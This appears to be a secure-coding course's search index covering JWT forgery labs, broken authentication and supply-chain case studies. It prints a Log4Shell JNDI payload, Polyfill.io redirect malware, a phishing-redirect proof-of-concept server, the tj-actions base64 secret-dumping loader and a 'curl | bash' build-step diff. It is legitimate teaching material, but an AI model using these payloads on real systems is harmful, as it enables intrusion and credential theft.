the request data\n    endpoint = \"...\"\n    credentials = {...}\n    ...\n</code></pre> <p>When you finished preparing the request, start the vulnerable program and run the exploit script. If it works, the script will show the content of the JWT.</p> <pre><code>Valid JWT Token: ...\n\nDecoded Header:\n{...}\n\nDecoded Payload:\n{...}\n</code></pre>"},{"location":"01-API-Authentication/4-2-Lab-Practice/#task-2-forge-a-jwt-to-escalate-privileges","title":"Task 2: Forge a JWT to Escalate Privileges","text":"<p>In this task, we will simulate how an attacker might attempt to gain unauthorized access to a protected endpoint by forging a JWT. Your goal is to prepare the JWT data to make a forged token to bypass authentication.</p> <pre><code>def forge_token(original_token):\n    ...\n    # Prepare the JWT data\n    header = {\n        \"alg\": \"...\",\n        \"typ\": \"...\",\n    }\n    payload = {\n        \"sub\": \"...\",\n        \"role\": \"...\",\n    }\n    ...\n    # Construct the token without a signature\n    forged_token = \"...\"\n    ...\n</code></pre> <p>When you finished forging a JWT, start the vulnerable program and run the exploit script. If it works, the server will respond with administrative access.</p> <pre><code>Response: 200 - {'message': 'Welcome admin!'}\n</code></pre>"},{"location":"01-API-Authentication/Merged/","title":"Introduction to API authentication","text":"<p>In this module, we will explore the various authentication concerns in APIs and how they can be exploited. By the end, you will know how to secure APIs effectively and prevent similar attacks when you implement an API.</p>"},{"location":"01-API-Authentication/Merged/#authentication","title":"Authentication","text":"<p>To integrate with different software or services, APIs will often define methods to share data and perform actions. For example, you might be familiar with delivery services. These services use APIs to share location data and estimated arrival times so you can stay updated. Because APIs often handle sensitive data, we expect only relevant parties can see our data.</p> <p>It would be wrong if anyone can access each other's data. That is why at the core of any API is authentication. This is a process that verifies the identity of a user to ensure only authorized people can access the API. We need authentication to secure sensitive data and ensure privacy and data integrity.</p>"},{"location":"01-API-Authentication/Merged/#authentication-methods","title":"Authentication Methods","text":"<p>When it comes to authentication, there are several methods available, each with its own use cases. These methods provide the necessary security and verification to ensure only authorized users can interact with the API.</p> <p>Basic Authentication: This is an older HTTP-based authentication scheme that lets users send their username and password as plain text in the HTTP request. This means it is easier to implement, but it is now considered outdated and insecure with most services requiring more secure methods.</p> <p>API Keys: This is a simple and commonly used method, where a unique key is assigned to each user and must be included in each API request. This ensures that the user is identified and authorized to access the API, but these keys can be hard to manage and distribute in large environments.</p> <p>JSON Web Tokens: This is a stateless and compact method to authenticate users. JWTs encode user credentials into a token, which is then sent with each API request. This means the server does not need to store session information, which makes JWTs a scalable solution to authenticate users.</p> <p>OAuth: This is a more advanced and secure protocol that allows users to grant third-party services access to their resources without sharing their actual credentials. It provides a safe and convenient way for users to log in to services using their existing social media accounts or other platforms.</p> <p>Each method has its own uses cases. To decide which method is best, we have to think about the security requirements, user experience, and scalability. For example, API keys are secure but it could be awkward for everyday use on a social media platform. But with proper authentication, we can secure sensitive data and maintain the integrity of the API.</p>"},{"location":"01-API-Authentication/Merged/#jwts","title":"JWTs","text":"<p>JSON Web Tokens (JWTs) were created to safely send data between systems. It uses a token, or compact string, to contain any kind of data, but is most commonly used to send information about users as part of authentication.</p> <p>What makes JWTs different from other authentication methods is that it stores all the data a server needs on the client side. This makes JWTs a popular choice when it comes to highly distributed services that scale.</p> <p>To better understand this, let's look at a JSON Web Token:</p> <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\neyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.\nKMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30\n</code></pre> <p>To make it easier to read, we split this token to show each part on its own line. While this token might look random, it is actually JSON data that has been encoded. This makes it very compact and easy to send in an API.</p> <p>The encoding used for JWTs is Base64Url, a variation of Base64 encoding that is URL-safe. This encoding ensures that the token can easily be sent in HTTP headers and URLs without issues. Base64Url encoding makes the token compact and easy to handle in API calls and can be decoded to see the data.</p> <pre><code>// URL-safe variant of Base64\nfunction b64(str) {\n    return new Buffer(str).toString('base64')\n                          .replace(/=/g, '')\n                          .replace(/\\+/g, '-')\n                          .replace(/\\//g, '_');\n}\n</code></pre> <p>If you decode this token, you will find information about the user that received this token. When a user sends a request to the API, they can use their token to tell the API their identity and what permissions they have.</p> <p>For example, this user is an admin called John Doe.</p> <pre><code>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.\n</code></pre> <pre><code>{\n  \"sub\": \"1234567890\",\n  \"name\": \"John Doe\",\n  \"admin\": true,\n  \"iat\": 1516239022\n}\n</code></pre> <p>By using JWTs, you can create secure and scalable systems where user information is reliably verified with each request. This makes JWTs an excellent choice for modern web applications and distributed services.</p>"},{"location":"01-API-Authentication/Merged/#jwt-format","title":"JWT Format","text":"<p>A JWT is made of three parts: the header, the payload, and the signature. Each part is encoded separately before being combined into the final token. These are all separated by a dot, as shown in the previous example.</p> <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\neyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.\nKMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30\n</code></pre> <p>In most cases, the header typically has two fields: the signing algorithm and the type of token. The signing algorithm tells the server what algorithm to use to verify the signature. And the type depends but is usually always JWT.</p> <pre><code>{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n</code></pre> <p>The payload contains all the information about the user. These are called \"claims\", and some are defined by the JWT spec. But, you will most likely define your own \"claims\" that aligns with what you need to authenticate.</p> <pre><code>{\n  \"sub\": \"1234567890\",\n  \"name\": \"John Doe\",\n  \"admin\": true,\n  \"iat\": 1516239022\n}\n</code></pre> <p>By now, you might have noticed that the data inside the token can easily be read or modified by anyone with access to the token. Because of this, the security of any JWT-based authentication is heavily reliant on the signature.</p>"},{"location":"01-API-Authentication/Merged/#jwt-signature","title":"JWT Signature","text":"<p>The signature can tell us if the token was tampered with. To create a signature we use the encoded header, encoded payload, a secret, and the algorithm specified in the header. This is signed to create a secure token.</p> <p>For example, let's say we want to use the HMAC SHA256 algorithm:</p> <pre><code>HMACSHA256(\n  base64UrlEncode(header) + \".\" +\n  base64UrlEncode(payload),\n  secret)\n</code></pre> <p>When we combine these parts together we can create a signature:</p> <pre><code>KMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30\n</code></pre> <p>Anytime the API gets a JWT, we can use the signature to verify the content it has. This is because it is derived from the rest of the token, so changing a single byte in the header or payload will result in a mismatched signature.</p>"},{"location":"01-API-Authentication/Merged/#jwt-security","title":"JWT Security","text":"<p>As you work with JWTs, you will notice how flexible they are. With JWTs, you can decide many implementation details to fit your use case. This is by design, making JWTs very adaptable, however, this flexibility can lead to vulnerabilities if not handled properly, even when using well-tested libraries.</p> <p>For example, one common mistake happens when the signature is not verified properly. Because the token tells the server what signing algorithm to use, an attacker can confuse the server with an algorithm it does not use, or trick the server by telling it there was no signing algorithm used at all.</p> <p>This is the <code>none</code> algorithm specified in the JWT spec.</p> <pre><code>{\n  \"alg\": \"none\",\n  \"typ\": \"JWT\"\n}\n</code></pre> <p>When the signature is not verified properly, this is known as an unsecure token. As a result, an attacker can modify the token to gain complete access.</p> <p>To avoid this, we need to implement proper checks and validations on the server side. For example, always ensure that the server only accepts specified algorithms and rejects tokens with none or any unsupported algorithms.</p> <pre><code>const allowedAlgorithms = [\n  'HS256', // HMAC using SHA-256\n  'RS256', // RSASSA PKCS1 v1.5 using SHA-256\n  'ES256'  // ECDSA using P-256 and SHA-256\n];\n</code></pre> <p>But, even if the signature is robustly verified, the security of JWTs relies heavily on the server's secret key staying a secret. If this key is leaked, guessed, or brute-forced, an attacker can generate a valid signature for any token. This would compromise the entire authentication mechanism.</p>"},{"location":"01-API-Authentication/Merged/#broken-authentication","title":"Broken Authentication","text":"<p>In APIs, we sometimes need to authenticate users to control what data they can access and the actions they can perform. This is because APIs often handle sensitive data, so we need robust authentication to verify the users.</p> <p>Broken Authentication is a vulnerability that happens when the API fails to properly authenticate users, which means unauthorized users could gain access to the API and its resources. This vulnerability usually happens because of weak credentials, misconfigurations, or wrong implementation.</p> <p>To better understand this, let's say we have an API that uses JWTs to authenticate users and we have an endpoint that returns sensitive data.</p> <pre><code>@app.route('/sensitive-data', methods=['GET'])\ndef sensitive_data():\n    token = request.headers.get('Authorization').split()[1]\n    try:\n        decoded = jwt.decode(token, options={'verify_signature': VERIFY_SIGNATURE})\n        return jsonify({'data': 'This is secured data'}), 200\n    except jwt.InvalidTokenError:\n        return jsonify({'message': 'Unauthorized'}), 401\n</code></pre> <p>When a user wants to access their data, a request is made to the <code>sensitive-data</code> endpoint. This will return any data about the user if their token is valid. However, an attacker might try to tamper and modify their token to steal another user's data, so we try to verify the token signature.</p> <p>But during development and testing phases, it might be easier to disable signature verification, so we include a <code>VERIFY_SIGNATURE</code> option to determine whether the token's signature should be verified. Developers can set this option locally using environment variables which is loaded after.</p> <p>This option, along with other data is managed in a <code>Settings</code> config.</p> <pre><code>class Settings:\n    JWT_SECRET_KEY = os.getenv(\"JWT_SECRET_KEY\", generate_random_secret())\n\n    # someone needs to remember to set this variable to True in env variables\n    JWT_VERIFY_SIGNATURE = os.getenv(\"JWT_VERIFY_SIGNATURE\")\n</code></pre> <p>However, when the application was deployed to production, the signature verification was mistakenly left disabled, leading to broken authentication. This means an attacker, could skip the signature and access the endpoint.</p> <pre><code>{\n  \"data\": \"This is secured data\"\n}\n</code></pre>"},{"location":"01-API-Authentication/Merged/#handle-broken-authentication","title":"Handle Broken Authentication","text":"<p>To address this issue, we need to ensure that the signature will always be verified. This is a simple misconfiguration mistake that can be fixed easily by setting <code>True</code> as the default value for <code>JWT_VERIFY_SIGNATURE</code>.</p> <pre><code>class Settings:\n    JWT_SECRET_KEY = os.getenv(\"JWT_SECRET_KEY\", generate_random_secret())\n\n    JWT_VERIFY_SIGNATURE = os.getenv(\"JWT_VERIFY_SIGNATURE\", True)\n</code></pre> <p>By using default values, we can ensure that important options are securely set to reduce the risk of broken authentication due to misconfiguration.</p>"},{"location":"05-Third-Party-Libraries/0-Overview/","title":"Overview","text":""},{"location":"05-Third-Party-Libraries/0-Overview/#topics","title":"Topics","text":"<p>This module explores the use of third-party libraries in software development and examines their benefits as well as the risks they can introduce. Key concepts include:</p> <ul> <li> <p>What Are Third-Party Libraries: Explains how developers use pre-built components to streamline development but highlights vulnerabilities from outdated or abandoned dependencies.</p> </li> <li> <p>Risks and Vulnerabilities: Reviews critical security risks, including compromised libraries, unpatched vulnerabilities, and transitive dependency issues.</p> </li> <li> <p>Strategies for Mitigation: Emphasizes best practices like regular updates, vetting sources, and using secure dependency management techniques.</p> </li> </ul>"},{"location":"05-Third-Party-Libraries/0-Overview/#real-examples","title":"Real Examples","text":"<p>Two case studies illustrate the consequences of relying on third-party libraries:</p> <ul> <li> <p>Pdoc and Polyfill.io: Demonstrates how the compromise of <code>Polyfill.io</code> led to widespread malware injection across applications, including Pdoc\u2019s documentation output.</p> </li> <li> <p>Coinbase and TJ-Actions: Explores how attackers attempted to compromise Coinbase by exploiting a vulnerable GitHub Action (<code>tj-actions/changed-files</code>) to expose CI/CD credentials in public logs.</p> </li> </ul> <p>These examples highlight the importance of monitoring third-party dependencies and maintaining secure development practices.</p>"},{"location":"05-Third-Party-Libraries/0-Overview/#practice","title":"Practice","text":"<p>The practice section offers interactive exercises designed to simulate real-world scenarios:</p> <ul> <li> <p>Redirect Clients: Exploit third-party scripts to redirect users to unintended websites.</p> </li> <li> <p>Steal Cookies: Learn how attackers target user cookies using malicious scripts and simulate a server-side attack.</p> </li> <li> <p>Keylogging: Examine how third-party scripts can capture sensitive data, like user key presses, and send it to malicious servers.</p> </li> </ul> <p>By completing these exercises, participants gain a deeper understanding of the risks associated with third-party libraries and learn techniques to safeguard applications effectively.</p>"},{"location":"05-Third-Party-Libraries/2-Content/","title":"Introduction to third party libraries","text":"<p>In software development, you will quickly find how often we rely on third-party libraries and frameworks to build products. These dependencies can significantly reduce the time we need, however, while we benefit from reusing code, we are not always aware of the vulnerabilities they might have.</p> <p>When you work on a project, we should not only be concerned about the time it takes to build it, but also how we can make it secure and reliable. In a competitive market, when there are security issues in your product, this can negatively affect customer expectations and result in serious financial losses.</p> <p>For example, in 2021, a critical security vulnerability known as Log4Shell was discovered in the Apache Log4j logging library. This library was used in various consumer and enterprise services, websites, and applications. So, when people found out that attackers can execute remote code on affected systems, there was a costly move to patch and mitigate the threat.</p>"},{"location":"05-Third-Party-Libraries/2-Content/#third-party-libraries","title":"Third-Party Libraries","text":"<p>Developers use third-party libraries because they are easy to install and integrate. With package managers like <code>npm</code>, <code>pip</code>, or <code>maven</code>, it is easy for you to search and install dependencies from centralized repositories.</p> <pre><code># Install a specific package from PyPI using pip\npython -m pip install &lt;some-project&gt;\n</code></pre> <p>When you install a package, you will typically specify the name and version. Many times, if you are joining a project, these packages or dependencies will be listed in a file like <code>package.json</code>, <code>requirements.txt</code>, or <code>pom.xml</code>.</p> <pre><code># Install all dependencies listed in requirements.txt\npython -m pip install -r requirements.txt\n</code></pre> <p>However, third-party libraries can have vulnerabilities like any other code, that attackers can exploit to attack your program. If these are not regularly updated or fixed, this becomes a problem for you as a user of the library.</p> <p>In the worst case, dependencies you might use can be abandoned. This means there could be a lack of updates and bug fixes, and oftentimes, you might need to find alternatives or maintain the dependency yourself.</p>"},{"location":"05-Third-Party-Libraries/2-Content/#handle-third-party-libraries","title":"Handle Third-Party Libraries","text":"<p>To prevent vulnerabilities from third-party libraries, we need to manage them effectively. We should start by carefully selecting what dependencies we plan to integrate. For example, choose libraries from reputable sources with active communities and regular updates.</p> <p>After you install third-party libraries, it is important that you regularly check for updates and security patches. The sooner you can apply bug fixes the less chance attackers can exploit the dependency in your program.</p> <p>If you find that a library is no longer receiving updates or support, consider replacing it with an actively maintained alternative. In some cases, you might need to fork the library and maintain it yourself, but this should be a last resort because maintenance can become another challenge.</p>"},{"location":"05-Third-Party-Libraries/2-Content/#real-world-example","title":"Real-World Example","text":"<p>Let's revisit the Log4Shell security incident to better understand how a third-party library could be exploited and put your program at risk of an attack.</p> <p>To review, this was a vulnerability in the widely used Apache Log4j logging library. This vulnerability allowed attackers to execute remote code by including malicious code in places the logging library could have been used.</p> <p>For example, let's say we installed the dependency for a Java project. To do this, we used maven and specified the vulnerable version at the time.</p> <pre><code>&lt;!-- install vulnerable log4j --&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;\n    &lt;version&gt;2.6.1&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> <p>This project was a simple API that processed messages received from users. Instead of creating our own logging solution, we used Log4j because it was the standard with many options to customize for our project.</p> <pre><code>@PostMapping(\"/process-message\")\npublic String processMessage(@RequestParam(\"message\") String message, Model model) {\n    // process the received message (e.g., log it)\n    logger.info(\"Received message: \" + message);\n\n    // add the message to the model (for displaying on a result page)\n    model.addAttribute(\"receivedMessage\", message);\n\n    // thymeleaf template name for displaying the result\n    return \"result\";\n}\n</code></pre> <p>However, it was discovered that attackers can exploit programs using this library by including malicious code as input to the logging function. This was possible because Log4j included many options for special use cases that treated special characters as instructions instead of normal data to log.</p> <p>For example, an exploit called Log4Shell used the following input:</p> <pre><code>${jndi:ldap://attackerserver.com:1389/ExploitPayload}\n</code></pre> <p>If this input was passed into our API endpoint, then it was possible for attackers to execute any code they wanted. As the exploit is called Log4Shell, the most common goal was to get a reverse shell. This meant attackers could have taken control of the server to perform any action.</p> <pre><code># Reverse shell established\nNetcat: Connection from &lt;ip_address&gt;\n\n# Command to print the current working directory\n$ pwd\n&gt; /home/ec2-user/victim\n\n# Command to print the current user\n$ whoami\n&gt; root\n</code></pre> <p>This was a real threat when the Log4j vulnerability was discovered. For example, you might be familiar with the video game Minecraft. At that time, attackers could have joined multiplayer servers and executed programs on the computer of any player, including the hosting server, who was there.</p> <p>To fix this vulnerability, the maintainers of Log4j quickly released hot patches to reduce the impact of attacks. Developers who depended on Log4j took steps to update their version. However, people realized that even if they did not directly use Log4j, they might have dependencies that did.</p>"},{"location":"05-Third-Party-Libraries/3-1-Real-Example/","title":"Real Example 1","text":""},{"location":"05-Third-Party-Libraries/3-1-Real-Example/#pdoc-and-polyfillio","title":"Pdoc and Polyfill.io","text":"<p>Third-party libraries are pre-built components that developers can integrate into their projects to simplify complex tasks and speed up development. However, they come with inherent risks, as they are created and maintained outside the project. If third-party libraries are not maintained properly, they can introduce vulnerabilities that can be exploited by malicious users.</p> <p>To understand the risks associated with third-party libraries, we will explore a real example involving Pdoc and <code>Polyfill.io</code>. Pdoc is a Python library used to generate documentation, and it relied on the <code>Polyfill.io</code> CDN to ensure compatibility across browsers. In this real example, we will learn how <code>Polyfill.io</code> was compromised to inject code in applications like Pdoc.</p>"},{"location":"05-Third-Party-Libraries/3-1-Real-Example/#polyfills","title":"Polyfills","text":"<p>In software development, a polyfill is code that implements a new standard feature in an old environment. This is a common practice done on older browsers to add support for modern features. For example, if a browser lacks support for a specific JavaScript function or HTML element, a polyfill can mimic that function, giving users of older browsers the same experience.</p> <p>Let's say we need to use the <code>Math.trunc</code> function. This would \"cut off\" the decimal part of an integer. For example, <code>Math.trunc(1.23)</code> returns <code>1</code>. However, older browsers might not support this function. To add support, we could implement a polyfill to mimic the <code>Math.trunc</code> function.</p> <pre><code>// Check if Math.trunc is supported\nif (!Math.trunc) {\n    // Implement the polyfill\n    Math.trunc = function(number) {\n        return number &lt; 0 ? Math.ceil(number) : Math.floor(number);\n    }\n}\n</code></pre> <p>In general, polyfills are particularly valuable in a rapidly evolving ecosystem, where maintaining broad compatibility is essential to reach large user bases.</p>"},{"location":"05-Third-Party-Libraries/3-1-Real-Example/#polyfillio","title":"Polyfill.io","text":"<p><code>Polyfill.io</code> was one service designed to simplify the use of polyfills. It provided a solution that delivered only necessary scripts based on the specific features needed by the user's browser. This tool proved to be convenient for developers aiming to reach users with low overhead.</p> <p>Developers would integrate <code>Polyfill.io</code> by adding a script tag in their HTML files. This script would dynamically fetch the appropriate polyfills, but developers could also indicate the particular features they needed like <code>ES6</code>.</p> <pre><code>&lt;script src=\"https://polyfill.io/v3/polyfill.min.js?features=es6\"&gt;&lt;/script&gt;\n</code></pre> <p>However, the original author of <code>Polyfill.io</code> never owned the domain name. Without influence over its sale, <code>Polyfill.io</code> was eventually sold to a Chinese company called Funnull in February 2024. On June 25, 2024, the Sansec forensics team reported a supply chain attack on <code>Polyfill.io</code> after the service started redirecting users to malicious sites and injecting malware.</p> <p>The people that were targeted in this attack were mobile users. When these users accessed compromised websites, the injected code would first check what device they were using to set up an appropriate redirection URL.</p> <pre><code>function check_tiaozhuan() {\n  var _isMobile = navigator.userAgent.match(\n    /(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i\n  );\n  if (_isMobile) {\n    var _curHost = window.location.host,\n      _ref = document.referrer,\n      _redirectURL = \"\",\n      _kuurzaBitGet = \"https://kuurza.com/redirect?from=bitget\",\n      _rnd = Math.floor(Math.random() * 100 + 1),\n      _date = new Date(),\n      _hours = _date.getHours();\n</code></pre> <p>Before the user is redirected, the <code>vfed_update</code> function would load a script from a fake Google Analytics domain and redirect if <code>usercache</code> is true.</p> <pre><code>function vfed_update(_0x5ae1f8) {\n  _0x5ae1f8 !== \"\" &amp;&amp;\n    loadJS(\n      \"https://www.googie-anaiytics.com/html/checkcachehw.js\",\n      function () {\n        if (usercache == true) {\n          window.location.href = _0x5ae1f8;\n        }\n      }\n    );\n}\n</code></pre> <p>By targeting a widely used service like Polyfill.io, the attackers managed to inject malware and exploit more than 100 thousand websites. This highlights the importance of continuously monitoring third-party libraries to be safe.</p>"},{"location":"05-Third-Party-Libraries/3-1-Real-Example/#pdoc","title":"Pdoc","text":"<p>In the context of Pdoc, a Python library used to generate documentation, one of the features they included was a math render mode using MathJax. This was particular useful for users that required precise math notation.</p> <pre><code># Enable math mode with --math flag\npdoc --math example.py\n</code></pre> <p>However, Pdoc was vulnerable because they relied on <code>Polyfill.io</code> to provide polyfills for browsers that lacked support for modern features required by MathJax. When users enabled math mode, the HTML output included a script tag that loaded <code>Polyfill.io</code>, recommended by MathJax.</p> <pre><code>{# This template is included in math mode and loads MathJax for formula rendering. #}\n\n...\n\n&lt;script src=\"https://polyfill.io/v3/polyfill.min.js?features=es6\"&gt;&lt;/script&gt;\n&lt;script id=\"MathJax-script\" async src=\"https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js\"&gt;&lt;/script&gt;\n</code></pre> <p>As a result, users of Pdoc who enabled math mode had harmful code injected after <code>Polyfill.io</code> was compromised.</p>"},{"location":"05-Third-Party-Libraries/3-1-Real-Example/#proof-of-concept","title":"Proof of Concept","text":"<p>To better understand how Pdoc users were impacted, we can create a compromised server to simulate how malicious JavaScript was injected. We start by creating a simple Python program to act as the victim of this attack.</p> <pre><code># Save this as example.py\ndef example_function():\n    \"\"\"\n    This is am example function.\n    \"\"\"\n    pass\n</code></pre> <p>Then, we install a vulnerable version of Pdoc and use Pdoc to generate documentation with math mode enabled for the victim website.</p> <pre><code>python -m pip install pdoc==14.5.0\n</code></pre> <pre><code>python -m pdoc --math example.py -o ./docs\n</code></pre> <p>In the HTML output, we can then modify <code>example.html</code> by replacing the <code>Polyfill.io</code> link with our own server at <code>http://localhost:8000</code>.</p> <pre><code>&lt;!-- Find the following line in your generated HTML --&gt; \n&lt;script src=\"https://polyfill.io/v3/polyfill.min.js?features=es6\"&gt;&lt;/script&gt; \n\n&lt;!-- Replace it with --&gt;\n&lt;script src=\"http://localhost:8000\"&gt;&lt;/script&gt;\n</code></pre> <p>To exploit the vulnerability in the victim program, we can create a script that sets up a malicious HTTP server using Python's <code>http.server</code> and <code>socketserver</code> modules. This will listen for GET requests and inject harmful code when the victim website is loaded in the user's browser.</p> <pre><code>import http.server\nimport socketserver\n\nclass MaliciousHandler(http.server.SimpleHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"application/javascript\")\n        self.end_headers()\n\n        # Malicious JavaScript payload\n        malicious_js = \"\"\"\n        (function() {\n            // Redirect to phishing site after 10 seconds\n            setTimeout(function() {\n                window.location.href = 'http://phishing-site.example.com';\n            }, 10000);\n        })();\n        \"\"\"\n        self.wfile.write(malicious_js.encode('utf-8'))\n\n\nif __name__ == \"__main__\":\n    with socketserver.TCPServer((\"\", 8000), MaliciousHandler) as httpd:\n        print(\"Serving malicious script at port 8000\")\n        httpd.serve_forever()\n</code></pre> <p>In this example, we redirect the user to another website after some time. This simulates a simplified version of the attack done by <code>Polyfill.io</code>.</p> <p></p>"},{"location":"05-Third-Party-Libraries/3-1-Real-Example/#mitigations","title":"Mitigations","text":"<p>To address the attacks done by <code>Polyfill.io</code>, the maintainers of Pdoc decided to remove the reference to <code>Polyfill.io</code> entirely. This was done to ensure no vulnerabilities are included in the documentation output.</p> <pre><code>{# This template is included in math mode and loads MathJax for formula rendering. #}\n\n...\n\n- &lt;script src=\"https://polyfill.io/v3/polyfill.min.js?features=es6\"&gt;&lt;/script&gt;\n&lt;script id=\"MathJax-script\" async src=\"https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js\"&gt;&lt;/script&gt;\n</code></pre> <p>As a result, users can now determine if they need polyfills in their documentation and do not need to depend on <code>Polyfill.io</code> specifically.</p> <p>The real example involving Pdoc and <code>Polyfill.io</code> demonstrates how third-party libraries can introduce vulnerabilities that compromise the application. By staying on top of updates and security patches on the libraries we use, we can protect our applications from similar threats.</p>"},{"location":"05-Third-Party-Libraries/3-2-Real-Example/","title":"Real Example 2","text":""},{"location":"05-Third-Party-Libraries/3-2-Real-Example/#coinbase-and-tj-actions","title":"Coinbase and TJ-Actions","text":"<p>Third-party libraries are pre-built components that developers can integrate into their projects to simplify complex tasks and speed up development. However, they come with inherent risks, as they are created and maintained outside the project. If third-party libraries are not maintained properly, they can introduce vulnerabilities that can be exploited by malicious users.</p> <p>To understand the risks associated with third-party libraries, we will explore a real example involving <code>coinbase/agentkit</code> and <code>tj-actions/changed-files</code>. Agentkit is a toolkit so AI agents can interact with blockchain networks. In this real example, we will learn how an attacker compromised <code>tj-actions/changed-files</code> in an attempt to compromise Coinbase.</p>"},{"location":"05-Third-Party-Libraries/3-2-Real-Example/#github-actions","title":"Github Actions","text":"<p>In software development, continuous integration and continuous delivery (CI/CD) is a common practice designed to improve software quality and delivery speed. GitHub Actions is a popular tool for implementing CI/CD pipelines. It allows developers to automate workflows, like building, testing, and deploying projects, all within the GitHub ecosystem.</p> <p>In GitHub Actions, a workflow is a set of instructions defined in a YAML file that can respond to specific triggers, like a code push or pull request. For example, this workflow will run when a change is made to the main branch.</p> <pre><code>name: Example\n\non:\n  push:\n    branches:\n      - main\n</code></pre> <p>A workflow can complete many different tasks and also include third-party actions to simplify complex tasks. For example, a Node.js project will often include <code>actions/setup-node</code> to set up Node.js with a specific version.</p> <pre><code>jobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Check out code\n        uses: actions/checkout@v3\n\n      - name: Set up Node.js\n        uses: actions/setup-node@v3\n        with:\n          node-version: '18'\n</code></pre> <p>GitHub Actions are widely used because they are easy to integrate and are flexible, but they also introduce risks. Since third-party actions can be sourced from community contributions, improper maintenance or malicious changes to these actions can compromise projects relying on them.</p>"},{"location":"05-Third-Party-Libraries/3-2-Real-Example/#tj-actionschanged-files","title":"<code>tj-actions/changed-files</code>","text":"<p>The GitHub Action <code>tj-actions/changed-files</code> is designed to track all changed files and directories. This action is particular useful for workflows where specific tasks need to be executed based on changes made to the repository. For example, <code>vitejs/vite</code> uses this action to automate testing.</p> <p>However, an attacker compromised a Personal Access Token (PAT) linked to a bot account used to maintain the repository. This gave the attacker access to push malicious code and update the release tags to use their changes. The malicious code was encoded in base64 and decoded at runtime as <code>run.sh</code>.</p> <pre><code>async function updateFeatures(token) {\n\n     const {stdout, stderr} = await exec.getExecOutput('bash', ['-c', `echo \"aWYgW1sgIiRPU1RZUEUiID09ICJsaW51eC1nbnUiIF1dOyB0aGVuCiAgQjY0X0JMT0I9YGN1cmwgLXNTZiBodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25pa2l0YXN0dXBpbi8zMGU1MjViNzc2YzQwOWUwM2MyZDZmMzI4ZjI1NDk2NS9yYXcvbWVtZHVtcC5weSB8IHN1ZG8gcHl0aG9uMyB8IHRyIC1kICdcMCcgfCBncmVwIC1hb0UgJyJbXiJdKyI6XHsidmFsdWUiOiJbXiJdKiIsImlzU2VjcmV0Ijp0cnVlXH0nIHwgc29ydCAtdSB8IGJhc2U2NCAtdyAwIHwgYmFzZTY0IC13IDBgCiAgZWNobyAkQjY0X0JMT0IKZWxzZQogIGV4aXQgMApmaQo=\" | base64 -d &gt; /tmp/run.sh &amp;&amp; bash /tmp/run.sh`], {\n         ignoreReturnCode: true,\n         silent: true\n     });\n     core.info(stdout);\n\n }\n</code></pre> <p>The point of this script was to download and run a Python script that can dump all CI/CD secret credentials into GitHub Action's workflow log files. If these log files are publicly accessible, then anyone could read these secrets.</p> <pre><code>if [[ \"$OSTYPE\" == \"linux-gnu\" ]]; then\n  B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | base64 -w 0 | base64 -w 0`\n  echo $B64_BLOB\nelse\n  exit 0\nfi\n</code></pre> <p>For example, a repository using the vulnerable <code>tj-actions/changed-files</code> might see their secret credentials in their workflow log files.</p> <p></p>"},{"location":"05-Third-Party-Libraries/3-2-Real-Example/#coinbaseagentkit","title":"<code>coinbase/agentkit</code>","text":"<p>In the context of <code>coinbase/agentkit</code>, the <code>tj-actions/changed-files</code> incident was one of many unsuccessful attempts to compromise the Coinbase repository. For example, in an earlier attempt the attacker managed to modify the build step in <code>coinbase/agentkit</code> to run a script.</p> <pre><code>\"scripts\": {\n-    \"build\": \"tsc\",\n+    \"build\": \"tsc &amp;&amp; curl -sSfL https://gist.githubusercontent.com/mmvojwip/bed37c8e5df4404cf04e183f5080861a/raw/setup.sh | bash &amp;&amp; exit 1\",\n    \"lint\": \"eslint -c .eslintrc.json \\\"src/**/*.ts\\\"\",\n    \"lint:fix\": \"eslint -c .eslintrc.json \\\"src/**/*.ts\\\" --fix\",\n    \"format\": \"prettier -c .prettierrc --write \\\"**/*.{ts,js,cjs,json,md}\\\"\",\n</code></pre> <p>When that failed, they looked at dependencies that <code>coinbase/agentkit</code> relied on. One of which was <code>tj-actions/changed-files</code>. By compromising this GitHub action, the attacker was not only able to target Coinbase, but also over 23,000 repositories that relied on this action. Although the attack on Coinbase was unsuccessful, many other repositories had their secret credentials leaked in the public workflow log files.</p>"},{"location":"05-Third-Party-Libraries/3-2-Real-Example/#proof-of-concept","title":"Proof of Concept","text":"<p>To better understand how users were impacted, we can use a security monitor like Harden Runner. We start by creating a workflow with <code>tj-actions/changed-files</code> and <code>step-security/harden-runner</code>.</p> <pre><code>name: \"tj-action changed-files incident\"\njobs:\n  changed_files:\n   ....\n    steps:\n      - name: Harden Runner\n        uses: step-security/harden-runner@v2\n        with:\n          